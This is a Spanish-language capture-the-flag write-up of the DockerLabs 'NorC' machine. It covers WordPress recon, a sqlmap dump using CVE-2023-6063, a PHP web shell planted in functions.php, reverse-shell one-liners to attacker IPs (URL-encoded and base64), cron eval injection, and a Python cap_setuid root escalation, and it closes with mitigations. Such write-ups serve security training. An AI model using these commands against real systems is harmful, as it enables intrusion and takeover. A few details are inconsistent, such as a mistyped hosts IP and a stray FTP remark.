---
title: NorC - Hard (Dockerlabs)
permalink: /Norc-Dockerlabs-Writeup/
tags:
  - "Linux"
  - "Hard"
  - "Wordpress"
  - "SQL Injection" 
  - "CVE-2023-6063"
  - "Command Injection"
  - "Capabilities"
categories:
  - writeup
  - hacking
  - dockerlabs
  - "hacking web"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo-title: NorC - Hard (Dockerlabs)
seo-description: Pon a prueba tus habilidades de enumeración de Wordpress, explotación de SQL Injection y abuso de capabilities para vencer NorC.
excerpt: Pon a prueba tus habilidades de enumeración de Wordpress, explotación de SQL Injection y abuso de capabilities para vencer NorC.
header:
  overlay_image: /assets/images/posts/DockerLabs/norc/norc.png
  overlay_filter: 0.7
  og_image: /assets/images/headers/norc-dockerlabs.jpg
---



![image-center](/assets/images/headers/dockerlabs.png){: .align-center}



### Lanzamiento laboratorio

![DockerLabs](/assets/images/posts/DockerLabs/norc/docker1.png){: .align-center}

Se procede a lanzar el docker sobre la maquina a vulnerar con numero de ip --> 172.17.0.2

## 🎯 0. Executive Summary (Resumen Ejecutivo)

Este informe describe los resultados de la evaluación de seguridad realizada sobre la máquina **Norc** (IP: 172.17.0.2).

### 🚨 Hallazgo de Máximo Riesgo: Acceso Total no Autorizado

Se logró la **explotación de múltiples vulnerabilidades** en la aplicación web y la configuración del sistema operativo, culminando en la **toma de control completa (compromiso de _root_)** del servidor.

### 💼 Impacto de Negocio

La vulnerabilidad más crítica identificada es la **ejecución remota de código (RCE) persistente** a través de un _script_ de tarea programada (Cron Job) mal configurado. El compromiso permite a un atacante no autenticado:

1. **Obtener credenciales de la base de datos** (a través de inyección SQL) y autenticarse como administrador de WordPress.    
2. **Ejecutar comandos arbitrarios** con privilegios del sistema a través de una función PHP modificada.    
3. **Escalar privilegios hasta `root`** mediante un _script_ Cron (`.wp-encrypted.txt`) que utiliza la función `eval()` sin saneamiento adecuado, y mediante el abuso de la _capability_ `cap_setuid` en el binario de Python.
    

**El impacto es Máximo:** Un atacante puede **robar todos los datos sensibles** de la base de datos (incluyendo información de clientes o usuarios), **modificar o destruir la aplicación**, y utilizar el servidor como **plataforma de lanzamiento** para otros ataques internos.

### 🛠️ Recomendación Urgente

Se requiere una acción inmediata para mitigar el riesgo:

- **Parcheo Crítico (RCE/Root):** **Eliminar o corregir** urgentemente el _script_ Cron que procesa el archivo `/var/www/html/.wp-encrypted.txt`, eliminando el uso de `eval()` sobre contenido controlado por el usuario.    
- **Vulnerabilidades de Base de Datos:** **Actualizar WordPress** y todos sus _plugins_ (incluyendo **WP Fastest Cache**) a sus últimas versiones estables para mitigar la Inyección SQL (`CVE-2023-6063`).    
- **Gestión de Capacidad:** Revisar y eliminar las _capabilities_ innecesarias (específicamente `cap_setuid`) de binarios como Python, que no deberían requerir tales permisos para su funcionamiento normal.



## 1. Reconnaissance and Service Detection

El proceso de reconocimiento se inició con la identificación de la superficie de ataque, confirmando la accesibilidad del _host_ objetivo en la dirección **172.17.0.2**.

### 1.1. Escaneo de Puertos y Servicios

Se ejecutó un escaneo exhaustivo de los 65535 puertos para identificar servicios activos y sus versiones.

**Comando de Escaneo:**

```json
nmap -p- --open --min-rate=5000 -sS -v -Pn -n -A 172.17.0.2 -oA <nombre_de_la_maquina>
xsltproc nmap.xml -o nmap.html
python3 -m http.server 4444


**Scan Command:**
bash
nmap -p- --open --min-rate=5000 -sS -v -Pn -n -A 172.17.0.2 -oX nmap.xml
```

![Nmap](/assets/images/posts/DockerLabs/norc/nmap.png){: .align-center}
![Nmap_2](/assets/images/posts/DockerLabs/norc/nmap2.png){: .align-center}

| Puerto 22/tcp | Servicio: ssh | Versión: OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)  
| Puerto 80/tcp | Servicio: tcp | Version: Apache httpd 2.4.59 ((Debian))   

### 1.2. Análisis del Servicio Web (Puerto 80)

Una detección de servicios más profunda (`-sCV`) en el puerto 80 reveló una configuración crítica de redireccionamiento.
A service scan was performed, exposing a file named **"nota.txt"** inside the FTP service with the **anonymous** user.
```json
nmap -sCV -p 22,80 -n -Pn 172.17.0.2 -oN allPorts

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 16:49 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 8c:5c:7b:fe:79:92:7a:f9:85:ec:a5:b9:27:25:db:85 (ECDSA)
|_  256 ba:69:95:e3:df:7e:42:ec:69:ed:74:9e:6b:f6:9a:06 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Did not follow redirect to http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2F172.17.0.2%2F
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds


```


![URL](/assets/images/posts/DockerLabs/norc/url_local.png){: .align-center}
Se esta aplicando una redireccion a norc.labs y no consigue resolver debido a la falta de la informacion en el archivo /etc/hosts.
```bash
echo '127.17.0.2\tnorc.labs' | sudo tee -a /etc/hosts
```



## 2. Enumeration and Initial Access (Enumeración y Acceso Inicial)

La etapa de enumeración se centró en mapear el contenido de la aplicación web de `norc.labs` y en identificar vectores de acceso no autenticado, basándose en los artefactos de WordPress previamente descubiertos.

### 2.1. Descubrimiento de Contenido con Gobuster

Se ejecutó un _fuzzing_ de directorios para mapear las rutas accesibles de la aplicación, utilizando una configuración robusta que seguía las redirecciones para capturar el contenido final.

```bash
❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -u http://norc.labs/ -r -x html,php
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://norc.labs/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/index.php            (Status: 200) [Size: 2586]
/rss                  (Status: 200) [Size: 2577]
/register             (Status: 200) [Size: 4795]
/login                (Status: 200) [Size: 2568]
/login.html           (Status: 200) [Size: 2568]
/login.php            (Status: 200) [Size: 2568]
/feed                 (Status: 200) [Size: 2580]
/atom                 (Status: 200) [Size: 2580]
/wp-login.html        (Status: 200) [Size: 2568]
/wp-login             (Status: 200) [Size: 2568]
/wp-login.php         (Status: 200) [Size: 2568]
/rss2                 (Status: 200) [Size: 2580]
/wp-includes          (Status: 403) [Size: 199]
/Login.php            (Status: 200) [Size: 2568]
/Login                (Status: 200) [Size: 2568]
/Login.html           (Status: 200) [Size: 2568]
/wp-register.php      (Status: 200) [Size: 2613]
/upgrade.php          (Status: 200) [Size: 2568]
/wp-rss2.php          (Status: 200) [Size: 2601]
/rdf                  (Status: 200) [Size: 2577]
/page1                (Status: 200) [Size: 2583]
/readme.html          (Status: 200) [Size: 7401]

________________________________________________                                                                                                                   :: Method           : GET                                        
 :: URL              : http://norc.labs/FUZZ                             
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt              
 :: Header           : Content-Type: application/x-www-form-urlencoded        
 :: Header           : Cookie: wordpress_test_cookie=WP%20Cookie%20check      
 :: Follow redirects : true                                                   
 :: Calibration      : false                                                 
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404                            
________________________________________________   
atom                    [Status: 200, Size: 2580, Words: 318, Lines: 116, Duration: 1053ms]                                              
embed                   [Status: 200, Size: 2583, Words: 318, Lines: 116, Duration: 5535ms]
gracias                 [Status: 500, Size: 2412, Words: 167, Lines: 115, Duration: 31ms]
Login                   [Status: 200, Size: 2568, Words: 318, Lines: 116, Duration: 2820ms]
login_db                [Status: 200, Size: 2568, Words: 318, Lines: 116, Duration: 2731ms]
logins                  [Status: 200, Size: 2568, Words: 318, Lines: 116, Duration: 1988ms]
login-redirect          [Status: 200, Size: 2568, Words: 318, Lines: 116, Duration: 1870ms]
loginadmin              [Status: 200, Size: 2568, Words: 318, Lines: 116, Duration: 2208ms]
login1                  [Status: 200, Size: 2568, Words: 318, Lines: 116, Duration: 3728ms]
login                   [Status: 200, Size: 2568, Words: 318, Lines: 116, Duration: 2315ms]
loginflat               [Status: 200, Size: 2568, Words: 318, Lines: 116, Duration: 3558ms]
page1                   [Status: 200, Size: 2583, Words: 318, Lines: 116, Duration: 3236ms]
robots.txt              [Status: 200, Size: 56, Words: 3, Lines: 4, Duration: 2952ms]
rss                     [Status: 200, Size: 2577, Words: 318, Lines: 116, Duration: 3392ms]
sitemap.xml             [Status: 200, Size: 2610, Words: 318, Lines: 116, Duration: 4892ms]
wp-login                [Status: 200, Size: 2568, Words: 318, Lines: 116, Duration: 1769ms]
xmlrpc.php              [Status: 200, Size: 2568, Words: 318, Lines: 116, Duration: 263ms]
wp-admin                [Status: 200, Size: 4603, Words: 243, Lines: 93, Duration: 192ms]
:: Progress: [4614/4614] :: Job [1/1] :: 22 req/sec :: Duration: [0:03:43] :: Errors: 1092 ::

```

**Análisis de Resultados Clave:**

- **Pistas de Arquitectura:** Se confirmaron múltiples rutas con artefactos de WordPress (`/wp-login.php`, `/wp-admin`, `/wp-includes`).
    
- **Patrón de Redirección:** La mayoría de las rutas accesibles (`Status: 200`) compartían un **tamaño de respuesta idéntico** (`Size: 2568` o similar), lo que confirmaba una **redirección centralizada** a un formulario de protección de acceso con contraseña.
    
- **Rutas de Alto Valor:** `/register`, `/login`, y la ruta administrativa `/wp-admin` fueron identificadas como puntos de interacción clave.


### 2.2. Análisis de Vulnerabilidades Automatizado (Nuclei)

Para verificar si existían vulnerabilidades conocidas en la infraestructura detectada, se utilizó el escáner de seguridad **Nuclei**.
```bash
❯ nuclei -u http://norc.labs/                                                                                                                                                                                                              
                                                                                                                                                                                                                                           
                     __     _                                                                                                                                                                                                              
   ____  __  _______/ /__  (_)                                                                                                                                                                                                             
  / __ \/ / / / ___/ / _ \/ /                                                                                                                                                                                                              
 / / / / /_/ / /__/ /  __/ /                                                                                                                                                                                                               
/_/ /_/\__,_/\___/_/\___/_/   v3.4.10                                                                                                                                                                                                      
                                                                                                                                                                                                                                           
                projectdiscovery.io                                                                                                                                                                                                        
                                                                                                                                                                                                                                           
[INF] nuclei-templates are not installed, installing...                                                                                                                                                                                    
[INF] Successfully installed nuclei-templates at /home/kali/.local/nuclei-templates                                                                                                                                                        
[WRN] Found 1 templates with syntax error (use -validate flag for further examination)                                                                                                                                                     
[INF] Current nuclei version: v3.4.10 (latest)                                                                                                                                                                                             
[INF] Current nuclei-templates version: v10.3.1 (latest)                                                                                                                                                                                   
[INF] New templates added in latest release: 119                                                                                                                                                                                           
[INF] Templates loaded for current scan: 8701                                                                                                                                                                                              
[INF] Executing 5 signed templates from projectdiscovery/nuclei-templates                                                                                                                                                                  
[WRN] Loading 8696 unsigned templates for scan. Use with caution.                                                                                                                                                                          
[INF] Targets loaded for current scan: 1                                                                                                                                                                                                   
[INF] Templates clustered: 1825 (Reduced 1714 Requests)                                                                                                                                                                                    
[INF] Using Interactsh Server: oast.fun                                                                                                                                                                                                    
[CVE-2021-24917] [http] [high] http://norc.labs/wp-admin/options.php ["http://norc.labs/ghost-login?redirect_to=%2Fwp-admin%2Fsomething&reauth=1"]                                                                                         
```

**Hallazgos:**

1. **Vulnerabilidad Detectada:** Nuclei identificó la **CVE-2021-24917** (vulnerabilidad de redirección abierta/inyección de encabezados en WordPress), clasificada como **riesgo Alto**.
    
2. **Contramedidas:** Se observó que el formulario de acceso contaba con **contramedidas contra la fuerza bruta**, limitando los intentos a solo **tres**, lo que invalidaba el enfoque de _brute-force_ simple contra el formulario.    

**Conclusión Estratégica:** Dada la contramedida de _brute-force_ y la detección de una infraestructura de WordPress (Apache 2.4.59), la estrategia se reorientó hacia la **explotación de vulnerabilidades de _plugins_ específicos** que pudieran ser abusadas sin autenticación.

En la siguiente foto se puede ver como se intenta un acceso pero automaticamente dice que solo quedan 2 intentos, es decir que el panel cuenta con contramedidas para la fuerza bruta.


![Wordpress](/assets/images/posts/DockerLabs/norc/wordpres2.png){: .align-center}



## 3. Exploitation: SQL Injection y Establecimiento de RCE

Esta sección detalla la explotación de la vulnerabilidad de Inyección SQL (SQLi) no autenticada para la obtención de credenciales administrativas y el posterior establecimiento de Ejecución Remota de Código (RCE) en el servidor web.

```
plugin: {wordpress-wp-fastest-cache} WP Fastest Cache 1.2.1
CVE Asociado: CVE-2023-6063
Vuln: Inyeccion SQL
```



### 3.1. Obtención de Credenciales Vía Inyección SQL

La vulnerabilidad se centró en el _plugin_ **WP Fastest Cache (v1.2.1)**, asociado a **CVE-2023-6063**, que permitía a un atacante no autenticado ejecutar consultas SQL arbitrarias. `https://github.com/thesafdari/CVE-2023-6063` 

Se empleó la herramienta **SQLMap** con las opciones de _dumping_ dirigido para acelerar la extracción de las columnas críticas (`user_login`, `user_pass`, `user_email`) de la tabla `wp_users`.

```js
# Comando de extracción de credenciales
sudo sqlmap --dbms=mysql -u "http://172.17.0.2/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 --schema --batch      


#EXTRAER/DUMPIAR Columnas
sudo sqlmap --dbms=mysql -u "http://norc.labs/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 -D wordpress -T wp_users --dump --batch

[04:19:06] [INFO] retrieved: ID
[04:19:39] [INFO] retrieved: user_login
[04:23:25] [INFO] retrieved: user_pass
[04:26:47] [INFO] retrieved: user_nicename
[04:30:56] [INFO] retrieved: user_email
[04:34:22] [INFO] retrieved: u
 
```

Debido a que tarda mucho esta explotacion decido buscar la estructura de wordpress para poder ir directo a las columnas que requiero.

![Wordpress](/assets/images/posts/DockerLabs/norc/wordpres1.png){: .align-center}



```js
# Comando de extracción de credenciales
# DUmpiando todo
sqlmap --dbms=mysql -u "http://norc.labs/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 -D wordpress -T wp_users -C user_login,user_pass,user_email --dump --batch
```

```bash
#Resultados: 
Database: wordpress
Table: wp_users
[1 entry]
+------------+------------------------------------+----------------------------+
| user_login | user_pass                          | user_email                 |
+------------+------------------------------------+----------------------------+
| admin      | $P$BeNShJ/iBpuokTEP2/94.sLS8ejRo6. | admin@oledockers.norc.labs |
+------------+------------------------------------+----------------------------+
```

### 3.2. Descubrimiento y Explotación del Subdominio Expuesto

El _hash_ de la contraseña (`$P$B...`) resultó ser resistente a la fuerza bruta. Sin embargo, el análisis del campo `user_email` (`admin@oledockers.norc.labs`) reveló la existencia de un subdominio no mapeado: **`oledockers.norc.labs`**.

Se actualizó la resolución de DNS local y se accedió al subdominio. La navegación a esta ruta reveló una **contraseña en texto plano** expuesta directamente en la página web, confirmando un fallo de seguridad crítico en la gestión de credenciales del sistema.

La contraseña obtenida fue utilizada exitosamente para la **autenticación administrativa** en el panel de WordPress



![Credenciales](/assets/images/posts/DockerLabs/norc/credentials_1.png){: .align-center}

### 3.3. Establecimiento de Ejecución Remota de Código (RCE)

Con acceso administrativo, se modificó el código del tema activo (o la creación de un _plugin_ temporal) para establecer una _backdoor_ de RCE, considerada una vulnerabilidad de **riesgo crítico**.

Se eligió modificar el archivo `functions.php` del tema para inyectar una función que permite la ejecución de comandos del sistema a través de un parámetro URL (`cmd`):

```php
system($_GET['cmd'])
```


![CMD_RCE](/assets/images/posts/DockerLabs/norc/cmd.png){: .align-center}


La **Ejecución Remota de Código (RCE)** se confirmó inmediatamente mediante la ejecución del comando `id` a través del navegador:

```bash
# Confirmación de RCE mediante ejecución del comando 'id'
http://norc.labs/wp-content/themes/twentytwentytwo/functions.php?cmd=id
```

Navegando a `http://norc.labs/wp-content/themes/twentytwentytwo/functions.php?cmd=id`
Confirmé que podía ejecutar comandos en el sistema.

![ID](/assets/images/posts/DockerLabs/norc/id.png){: .align-center}


**URL** encodeada para consegir *acceso* remoto:
`http://norc.labs/wp-content/themes/twentytwentytwo/functions.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.171%2F1234%200%3E%261%22`.

### 3.4. Alternativa de Persistencia: Inyección Vía Plugin

Como metodología alternativa al ataque de inyección directa en el tema (`functions.php`), se consideró la instalación de un _plugin_ malicioso para asegurar el acceso remoto.

1. **Carga del Plugin:** Se utilizó la función de carga de plugins del panel de administración de WordPress para subir un _plugin_ preexistente que contenía una _reverse shell_ (`reverse-shell-v1.4.0.zip`).

![Plugin Upload](/assets/images/posts/DockerLabs/norc/plugin2.png){: .align-center}   
    
2. **Activación y Ejecución:** Tras la carga y activación del _plugin_ "rev shell", la conexión de _reverse shell_ se iniciaba al acceder a la URL del _plugin_ inyectado, proporcionando una consola interactiva al atacante.


Esta técnica confirmó una **falta de control de integridad del código** en el panel de administración, permitiendo la inyección de código PHP con privilegios de ejecución del servidor web (`www-data`).




## 4. Post-Exploitation y Estabilización de Acceso

Tras obtener la Ejecución Remota de Código (RCE) como el usuario de baja prioridad `www-data` (detallado en la Sección 3), el enfoque se movió a estabilizar la conexión y iniciar la fase de escalada de privilegios.
### 4.1. Refinamiento del Acceso Persistente

Inicialmente, se intentó utilizar la metodología de inyección de código mediante la carga de un _plugin_ de _reverse shell_ pre-construido.

![Plugin Upload](/assets/images/posts/DockerLabs/norc/plugin.png){: .align-center}  

Debido a problemas de inestabilidad y cierres inesperados de la consola, se optó por la técnica de _backdoor_ directa en el código del tema (`functions.php`), ya implementada para el RCE, asegurando una conexión más fiable y controlada para la fase de post-explotación.
[GitHub Plugin Rev Shell para Wordpress](https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin/blob/main/reverse-shell.php)

Y al final se consiguio el RevShell con el metodo atenrior de modificar el Plugin:


![Plugin](/assets/images/posts/DockerLabs/norc/plugin2.png){: .align-center}


## ## 5. Post-Exploitation y Preparación para la Escalada de Privilegios

Una vez que se estableció la _reverse shell_ inicial como el usuario de baja prioridad `www-data`, la fase de post-explotación se centró en estabilizar la consola y auditar el sistema para identificar el vector de escalada de privilegios.
### 5.1. Estabilización de Consola Interactiva (TTY)
La _shell_ obtenida inicialmente no era totalmente interactiva. Para facilitar la navegación, la ejecución de herramientas y el manejo de comandos complejos, se implementó el siguiente proceso de **tratamiento TTY** (Teletypewriter) estándar.

Este procedimiento aseguró una consola robusta, esencial para la auditoría interna del sistema:
```bash
script /dev/null -c bash

  #         control + z   
  
stty raw -echo; fg

reset #(Enter)

xterm #(Enter)

export TERM=xterm
	o
export TERM=xterm-256color

export SHELL=bash  
```


### 5.2. Enumeración de Privilegios con Linpeas

Con una consola interactiva estable, se procedió a la auditoría interna del _host_ mediante la herramienta de enumeración **Linpeas.sh** para identificar configuraciones erróneas y vectores de escalada.

El análisis reveló dos hallazgos de alto riesgo que constituían la cadena de escalada de privilegios:

1. **Explotación de Tarea Cron Job (Escalada a `kvzlx`):** Presencia de un _script_ Cron que utilizaba la función `eval()` sobre contenido controlable.
    
2. **Abuso de Capabilities (Escalada a `root`):** Configuración de _capabilities_ elevadas (`cap_setuid`) en el binario de Python.
[LinPeas.sh GitHub](https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md)

![Linpeas](/assets/images/posts/DockerLabs/norc/linpeas.png){: .align-center}


## 6. Privilege Escalation (Parte 1): Explotación del Cron Job


### 6.1. Identificación y Análisis del Vector de Cron
La primera etapa de la escalada de privilegios se logró explotando una tarea programada (Cron Job) mal configurada, lo que permitió elevar el acceso de `www-data` al usuario del sistema **`kvzlx`**.

Expuesto el codigo y dejandonos ver su funcionamiento para posterior realizar la modificacion y beneficio en la escalada de privilegios como muestra la siguiente captura de pantalla. 

![Script](/assets/images/posts/DockerLabs/norc/script1.png){: .align-center}
El uso de eval sin tratamiento adecuado en un script cron representa una vulnerabilidad crítica. Permite ejecutar comandos arbitrarios si se controla el contenido del archivo **‘/var/www/html/.wp-encrypted.txt’**.


### 6.2. Inyección y Ejecución de la Carga Útil
Para explotar esta vulnerabilidad, se creó una carga útil de _reverse shell_ y se codificó en Base64, siguiendo el requerimiento de decodificación (`base64_decode`) del _script_ PHP.

```bash
/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.18/4444 0>&1'
```

```bash 
**Carga Útil Base64:**

L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4xOC80NDQ0IDA+JjEi
```

### 6.3. Inyección de la Carga Útil y Escalada a `kvzlx`
En la siguiente captura se puede apreciar una particion de 4 pantallas. 
La primera arriba a la izquierda se puede ver que se probo la ejecucion aun viendo que no contaba con permisos pero en la ventana de abajo se aprecia
como se realizo la codificacion del comando **/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.18/4444 0>&1'** el cual se procedio a agregarlo en el archivo **/var/www/html/.wp-encrypted.txt**
dejando por ultimo a la ventana de abajo a la derecha con el acceso como el usuario **kvzlx**


![Up_1](/assets/images/posts/DockerLabs/norc/up_1.png){: .align-center}

Tras esperar el intervalo de ejecución programado del Cron Job (típicamente un minuto), la carga útil se ejecutó con éxito. Esto resultó en una nueva conexión de _reverse shell_ en el puerto 4444.

La nueva _shell_ interactiva confirmó la escalada de privilegios, pasando de **`www-data`** al usuario **`kvzlx`**.






## 7. Privilege Escalation (Parte 2): Acceso Root Mediante Capabilities

La fase final de la escalada de privilegios se logró a partir de los hallazgos de `Linpeas.sh`, explotando una configuración insegura en el sistema: la asignación de _capabilities_ elevadas a binarios.

### 7.1. Identificación del Vector de Capabilities

Desde la sesión del usuario `kvzlx`, se utilizó el comando `getcap` (previamente sugerido por Linpeas) para buscar binarios que tuvieran asignada la _capability_ **`cap_setuid=ep`**.

Bash

```
find / -type f 2>/dev/null|xargs /sbin/getcap -r 2>/dev/null|grep cap_setuid=ep
```

![Wordpress](/assets/images/posts/DockerLabs/norc/find1.png){: .align-center}
Este escaneo reveló que el binario del intérprete de Python (`/opt/python3`) tenía la _capability_ **`cap_setuid+ep`** configurada. Esta configuración es un fallo de seguridad crítico, ya que permite al binario **cambiar su ID de usuario efectivo** a cualquier ID, incluyendo **cero (root)**, sin requerir una contraseña.

### 7.2. Abuso de la Capability `cap_setuid`

Utilizando el recurso de **GTFOBins** para el abuso de _capabilities_ en Python, se construyó una carga útil para ejecutar una _shell_ con privilegios de `root`. La _capability_ `cap_setuid` permite a Python establecer temporalmente su ID de usuario efectivo a 0 (root).

**Carga Útil de Explotación:** La explotación se realizó mediante la ejecución directa de un _script_ Python:

```python
/opt/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

- `import os;`: Importa la biblioteca de funciones del sistema.
    
- `os.setuid(0);`: Cambia el ID de usuario efectivo del proceso a `0` (root), gracias a la _capability_ `cap_setuid`.
    
- `os.system("/bin/bash")`: Ejecuta una nueva _shell_ de Bash con el ID de usuario recién elevado.
    

### 7.3. Confirmación del Compromiso de Root

Tras la ejecución exitosa de la carga útil, se verificó el nuevo nivel de privilegio.

El comando `whoami` confirmó el éxito de la escalada final, estableciendo el **compromiso total** del servidor como el usuario **`root`**.


```bash
whoami
root
```


![Root](/assets/images/posts/DockerLabs/norc/root.png){: .align-center} 


## 8. ⛓️ Cadena de Ataque (Attack Kill Chain)

La explotación de la máquina Norc no se basó en una única vulnerabilidad, sino en una secuencia crítica de fallos de seguridad. La tabla a continuación resume la progresión desde el acceso inicial hasta el compromiso total del sistema.

|**Etapa**|**Vector Explotado**|**Resultado Obtenido**|**Riesgo**|
|---|---|---|---|
|**Reconocimiento**|Redirección de Dominio (`norc.labs`)|Mapeo de _hostname_ correcto.|Bajo|
|**Acceso Inicial**|Inyección SQL (CVE-2023-6063)|Credenciales de Administrador (hash y email).|Alto|
|**Movimiento Lateral**|Subdominio Expuesto (`oledockers.norc.labs`)|Contraseña en texto plano para el usuario `admin`.|Crítico|
|**Persistencia/RCE**|Inyección de Código PHP en _Theme_|Ejecución Remota de Código (RCE) como usuario `www-data`.|Crítico|
|**Escalada (Fase 1)**|Tarea Cron Insegura (`eval()` en `.wp-encrypted.txt`)|Acceso elevado como usuario del sistema **`kvzlx`**.|Alto|
|**Escalada (Fase 2)**|Abuso de _Capabilities_ (`cap_setuid` en Python)|**Compromiso total del sistema (Root)**.|Crítico|

---

## 9. 🛡️ Recomendaciones y Contramedidas de Mitigación

Las siguientes recomendaciones abordan las fallas de seguridad identificadas, priorizando las acciones para evitar la repetición de la cadena de compromiso y **cumplir con los requisitos de endurecimiento (_hardening_)** del sistema.

### 9.1. Recomendaciones Críticas (RCE y Privilegios)

|**Vulnerabilidad**|**Riesgo**|**Contramedida (Acción Correctiva)**|
|---|---|---|
|**RCE vía Cron Job**|Ejecución de código como `kvzlx`.|**Eliminar/Corregir Script:** La función `eval()` sobre contenido externo (como `.wp-encrypted.txt`) debe ser eliminada. El _script_ debe usar funciones seguras y verificar la integridad del contenido.|
|**Abuso de Capabilities**|Escalada a `root` mediante Python.|**Revisión de Permisos:** Eliminar la _capability_ **`cap_setuid`** del binario `/opt/python3`. Solo el usuario `root` debe tener esta capacidad. Usar el comando: `sudo setcap -r /opt/python3`.|
|**Acceso Administrativo Web**|Inyección de código en _themes_.|**Endurecimiento de WordPress:** Desactivar la edición de temas y _plugins_ desde el panel de WP. Añadir `define('DISALLOW_FILE_EDIT', true);` en `wp-config.php`.|

### 9.2. Recomendaciones de Seguridad Web y Aplicación

|**Vulnerabilidad**|**Riesgo**|**Contramedida (Acción Preventiva)**|
|---|---|---|
|**Inyección SQL (CVE-2023-6063)**|Extracción de base de datos.|**Gestión de Parches:** Actualizar inmediatamente el _plugin_ **WP Fastest Cache** a la última versión o desinstalarlo. Implementar **consultas parametrizadas** en todo el código PHP.|
|**Exposición de Credenciales**|Movimiento lateral.|**Higiene de Credenciales:** Eliminar todas las credenciales de texto plano del código fuente o de las páginas web (p. ej., en el subdominio `oledockers.norc.labs`). Las contraseñas deben estar en archivos de configuración protegidos.|
|**Contramedida Ineficaz**|Límite de intentos de login.|**Implementar Bloqueo IP:** Implementar un WAF o una regla de _firewall_ (Fail2Ban) que bloquee la IP de origen después de 3-5 intentos fallidos, en lugar de solo mostrar un mensaje.|

### 9.3. Recomendaciones Generales del Sistema

- **Parcheo de OS:** Asegurar que el sistema base **Linux (Debian)** y el servidor **Apache (v2.4.59)** estén actualizados a la última versión para mitigar cualquier CVE pública.
    
- **Principio del Mínimo Privilegio:** Asegurar que el usuario `kvzlx` tenga los permisos estrictamente necesarios para su operación y que el usuario `www-data` no tenga permisos de escritura en la mayoría de los directorios de la aplicación.
    
- **Monitoreo:** Implementar monitoreo de integridad de archivos (FIM) para detectar modificaciones no autorizadas en archivos críticos como `functions.php` o tareas Cron.